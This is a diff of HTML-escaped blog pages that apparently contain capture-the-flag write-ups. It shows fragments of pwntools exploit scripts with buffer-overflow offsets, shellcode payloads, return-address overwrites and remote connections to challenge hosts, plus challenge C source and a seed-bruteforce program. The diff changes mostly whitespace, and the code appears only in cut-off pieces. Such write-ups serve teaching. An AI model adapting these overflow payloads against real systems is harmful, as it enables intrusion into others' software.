+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
 &lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; std;
 
@@ -1951,7 +2326,7 @@ document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPo
 &lt;p&gt;The offset of the crash is calculated using gef&amp;rsquo;s pattern create and pattern search functionality.&lt;/p&gt;
 &lt;p&gt;My exploit code -&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./kamikaze&amp;#34;&lt;/span&gt;)
 e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./kamikaze&amp;#39;&lt;/span&gt;)
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.48.67.196&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50000&lt;/span&gt;)
@@ -2003,7 +2378,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 &lt;p&gt;After this, it becomes just a matter of calculating offsets. We place the return address on the stack in two parts, and the offsets are calculated accordingly. I could go in depth regarding the offsets, but it is a pretty simple (not easy) process. If you have doubts, leave a comment, I will explain it.&lt;/p&gt;
 &lt;p&gt;The final exploit code is -&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./kamikaze2&amp;#34;&lt;/span&gt;)
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.53.125.206&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50000&lt;/span&gt;)
 
@@ -2209,7 +2584,7 @@ document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPo
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
 
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./thefirst&amp;#34;&lt;/span&gt;)
-&lt;span style=&#34;color:#75715e&#34;&gt;# p = remote(&amp;#34;chal.tuctf.com&amp;#34;, 30508)&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# p = remote(&amp;#34;chal.tuctf.com&amp;#34;, 30508)&lt;/span&gt;
 print_flag_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80491f6&lt;/span&gt;
 offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
 
@@ -2256,7 +2631,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 len_shell_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;
 
 &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./shellme32&amp;#34;&lt;/span&gt;)
 
 offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
@@ -2288,7 +2663,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 len_shell_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;
 
 &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./shellme64&amp;#34;&lt;/span&gt;)
 
 offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
@@ -2303,8 +2678,8 @@ log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&
 payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shellcode
 payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; len(shellcode))
 
-&lt;span style=&#34;color:#75715e&#34;&gt;# with open(&amp;#39;payload&amp;#39;, &amp;#39;wb&amp;#39;) as f:&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#     f.write(payload)&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# with open(&amp;#39;payload&amp;#39;, &amp;#39;wb&amp;#39;) as f:&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#     f.write(payload)&lt;/span&gt;
 payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(addr)
 
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
@@ -2473,13 +2848,13 @@ printFlag(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;sp
 &lt;hr&gt;
 &lt;h2 id=&#34;core---400-pts&#34;&gt;core - 400 pts&lt;/h2&gt;
 &lt;p&gt;We a re provided a core dump and a C file. The C file looks like this&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;  // prints&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt; // malloc&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt; // strcmp&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt; // read&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;  // open&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt; // close&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;time.h&amp;gt;   // time&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;  // prints&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt; // malloc&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt; // strcmp&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt; // read&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;  // open&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt; // close&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;time.h&amp;gt;   // time&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
 &lt;span style=&#34;color:#75715e&#34;&gt;#define FLAG_LEN 64
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; flag[FLAG_LEN];
@@ -2618,8 +2993,8 @@ flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#3
 &lt;p&gt;Are you starting to &amp;lsquo;C&amp;rsquo; a pattern?&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;We make a guess that whenever we request that host and port, the random function is initialized with a certain seed and we are given the first five random numbers generated from that seed. So, I wrote a simple C code to bruteforce all unix timestamps from 15th Nov 2019, 00:00 UTC to 17th Nov. 2019 00:00 UTC, and check for the seed. The code is shown below —&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
 &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
     &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1573776000&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;// 15th Nov 2019, 00:00 UTC
